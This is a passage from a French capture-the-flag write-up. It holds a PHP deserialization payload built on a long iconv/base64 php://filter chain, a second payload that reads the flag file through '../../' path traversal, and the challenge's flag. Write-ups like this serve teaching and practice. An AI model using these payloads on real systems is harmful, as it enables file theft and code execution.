OSUNPREV8Y29udmVydC5pY29udi5MNC5VQ1MyfGNvbnZlcnQuaWNvbnYuVUNTLTIuT1NGMDAwMzAwMTB8Y29udmVydC5pY29udi5DU0lCTTEwMDguVVRGMzJCRXxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuQ1AtQVIuVVRGMTZ8Y29udmVydC5pY29udi44ODU5XzQuQklHNUhLU0NTfGNvbnZlcnQuaWNvbnYuTVNDUDEzNjEuVVRGLTMyTEV8Y29udmVydC5pY29udi5JQk05MzIuVUNTLTJCRXxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuQ1A4NjkuVVRGLTMyfGNvbnZlcnQuaWNvbnYuTUFDVUsuVUNTNHxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuUFQuVVRGMzJ8Y29udmVydC5pY29udi5LT0k4LVUuSUJNLTkzMnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuQ1AzNjcuVVRGLTE2fGNvbnZlcnQuaWNvbnYuQ1NJQk05MDEuU0hJRlRfSklTWDAyMTN8Y29udmVydC5pY29udi5VSEMuQ1AxMzYxfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5ERUMuVVRGLTE2fGNvbnZlcnQuaWNvbnYuSVNPODg1OS05LklTT182OTM3LTJ8Y29udmVydC5pY29udi5VVEYxNi5HQjEzMDAwfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi44NjMuVU5JQ09ERXxjb252ZXJ0Lmljb252LklTSVJJMzM0Mi5VQ1M0fGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5VVEY4LkNTSVNPMjAyMktSfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi44NjMuVVRGLTE2fGNvbnZlcnQuaWNvbnYuSVNPNjkzNy5VVEYxNkxFfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5NQUMuVVRGMTZ8Y29udmVydC5pY29udi5MOC5VVEYxNkJFfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5MNS5VVEYtMzJ8Y29udmVydC5pY29udi5JU084ODU5NC5HQjEzMDAwfGNvbnZlcnQuaWNvbnYuQ1A5NTAuU0hJRlRfSklTWDAyMTN8Y29udmVydC5pY29udi5VSEMuSk9IQUJ8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LlNFMi5VVEYtMTZ8Y29udmVydC5pY29udi5DU0lCTTExNjEuSUJNLTkzMnxjb252ZXJ0Lmljb252Lk1TOTMyLk1TOTM2fGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5KUy5VTklDT0RFfGNvbnZlcnQuaWNvbnYuTDQuVUNTMnxjb252ZXJ0Lmljb252LlVDUy0yLk9TRjAwMDMwMDEwfGNvbnZlcnQuaWNvbnYuQ1NJQk0xMDA4LlVURjMyQkV8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LkNQMzY3LlVURi0xNnxjb252ZXJ0Lmljb252LkNTSUJNOTAxLlNISUZUX0pJU1gwMjEzfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5DUC1BUi5VVEYxNnxjb252ZXJ0Lmljb252Ljg4NTlfNC5CSUc1SEtTQ1N8Y29udmVydC5pY29udi5NU0NQMTM2MS5VVEYtMzJMRXxjb252ZXJ0Lmljb252LklCTTkzMi5VQ1MtMkJFfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5QVC5VVEYzMnxjb252ZXJ0Lmljb252LktPSTgtVS5JQk0tOTMyfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5DUDM2Ny5VVEYtMTZ8Y29udmVydC5pY29udi5DU0lCTTkwMS5TSElGVF9KSVNYMDIxM3xjb252ZXJ0Lmljb252LlVIQy5DUDEzNjF8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252Ljg1MS5VVEYtMTZ8Y29udmVydC5pY29udi5MMS5ULjYxOEJJVHxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuODYzLlVOSUNPREV8Y29udmVydC5pY29udi5JU0lSSTMzNDIuVUNTNHxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuUFQuVVRGMzJ8Y29udmVydC5pY29udi5LT0k4LVUuSUJNLTkzMnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuQ1AzNjcuVVRGLTE2fGNvbnZlcnQuaWNvbnYuQ1NJQk05MDEuU0hJRlRfSklTWDAyMTN8Y29udmVydC5pY29udi5VSEMuQ1AxMzYxfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5KUy5VTklDT0RFfGNvbnZlcnQuaWNvbnYuTDQuVUNTMnxjb252ZXJ0Lmljb252LlVDUy00TEUuT1NGMDUwMTAwMDF8Y29udmVydC5pY29udi5JQk05MTIuVVRGLTE2TEV8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252Ljg4NTlfMy5VVEYxNnxjb252ZXJ0Lmljb252Ljg2My5TSElGVF9KSVNYMDIxM3xjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuVVRGOC5DU0lTTzIwMjJLUnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuQ1AxMDQ2LlVURjMyfGNvbnZlcnQuaWNvbnYuTDYuVUNTLTJ8Y29udmVydC5pY29udi5VVEYtMTZMRS5ULjYxLThCSVR8Y29udmVydC5pY29udi44NjUuVUNTLTRMRXxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuQ1A4NjEuVVRGLTE2fGNvbnZlcnQuaWNvbnYuTDQuR0IxMzAwMHxjb252ZXJ0Lmljb252LkJJRzUuSk9IQUJ8Y29udmVydC5pY29udi5DUDk1MC5VVEYxNnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuTDUuVVRGLTMyfGNvbnZlcnQuaWNvbnYuSVNPODg1OTQuR0IxMzAwMHxjb252ZXJ0Lmljb252LkNQOTUwLlNISUZUX0pJU1gwMjEzfGNvbnZlcnQuaWNvbnYuVUhDLkpPSEFCfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5TRTIuVVRGLTE2fGNvbnZlcnQuaWNvbnYuQ1NJQk0xMTYxLklCTS05MzJ8Y29udmVydC5pY29udi5NUzkzMi5NUzkzNnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuU0UyLlVURi0xNnxjb252ZXJ0Lmljb252LkNTSUJNMTE2MS5JQk0tOTMyfGNvbnZlcnQuaWNvbnYuQklHNUhLU0NTLlVURjE2fGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi44NTEuVVRGLTE2fGNvbnZlcnQuaWNvbnYuTDEuVC42MThCSVR8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LkNTSUJNMTE2MS5VTklDT0RFfGNvbnZlcnQuaWNvbnYuSVNPLUlSLTE1Ni5KT0hBQnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuU0UyLlVURi0xNnxjb252ZXJ0Lmljb252LkNTSUJNOTIxLk5BUExQU3xjb252ZXJ0Lmljb252LkNQMTE2My5DU0FfVDUwMHxjb252ZXJ0Lmljb252LlVDUy0yLk1TQ1A5NDl8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LlNFMi5VVEYtMTZ8Y29udmVydC5pY29udi5DU0lCTTExNjEuSUJNLTkzMnxjb252ZXJ0Lmljb252LkJJRzVIS1NDUy5VVEYxNnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuU0UyLlVURi0xNnxjb252ZXJ0Lmljb252LkNTSUJNOTIxLk5BUExQU3xjb252ZXJ0Lmljb252Ljg1NS5DUDkzNnxjb252ZXJ0Lmljb252LklCTS05MzIuVVRGLTh8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252Ljg4NTlfMy5VVEYxNnxjb252ZXJ0Lmljb252Ljg2My5TSElGVF9KSVNYMDIxM3xjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuQ1AxMDQ2LlVURjE2fGNvbnZlcnQuaWNvbnYuSVNPNjkzNy5TSElGVF9KSVNYMDIxM3xjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuQ1AxMDQ2LlVURjMyfGNvbnZlcnQuaWNvbnYuTDYuVUNTLTJ8Y29udmVydC5pY29udi5VVEYtMTZMRS5ULjYxLThCSVR8Y29udmVydC5pY29udi44NjUuVUNTLTRMRXxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuTUFDLlVURjE2fGNvbnZlcnQuaWNvbnYuTDguVVRGMTZCRXxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuQ1NJQk0xMTYxLlVOSUNPREV8Y29udmVydC5pY29udi5JU08tSVItMTU2LkpPSEFCfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5JTklTLlVURjE2fGNvbnZlcnQuaWNvbnYuQ1NJQk0xMTMzLklCTTk0M3xjb252ZXJ0Lmljb252LklCTTkzMi5TSElGVF9KSVNYMDIxM3xjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuU0UyLlVURi0xNnxjb252ZXJ0Lmljb252LkNTSUJNMTE2MS5JQk0tOTMyfGNvbnZlcnQuaWNvbnYuTVM5MzIuTVM5MzZ8Y29udmVydC5pY29udi5CSUc1LkpPSEFCfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPXBocDovL3RlbXAiO3M6NToiZGVidWciO2I6MTtzOjc6InZlcnNpb24iO3M6NDoidjEuMCI7czoxMToiYmV0dGVycHJpbnQiO2I6MTt9

On obtient alors le chemin du flag : /var/www/html/flag-94583458938490289047237492374.txt

On peut donc le récupérer avec : 

.. code-block:: console

    O:6:"Parser":4:{s:4:"text";s:44:"../../flag-94583458938490289047237492374.txt";s:5:"debug";b:1;s:7:"version";s:4:"v1.0";s:11:"betterprint";b:1;}
    Tzo2OiJQYXJzZXIiOjQ6e3M6NDoidGV4dCI7czo0NDoiLi4vLi4vZmxhZy05NDU4MzQ1ODkzODQ5MDI4OTA0NzIzNzQ5MjM3NC50eHQiO3M6NToiZGVidWciO2I6MTtzOjc6InZlcnNpb24iO3M6NDoidjEuMCI7czoxMToiYmV0dGVycHJpbnQiO2I6MTt9

Et on obtient notre flag : **SHLK{fr0m_l177l3_vuln_70_70p_vuln}** 
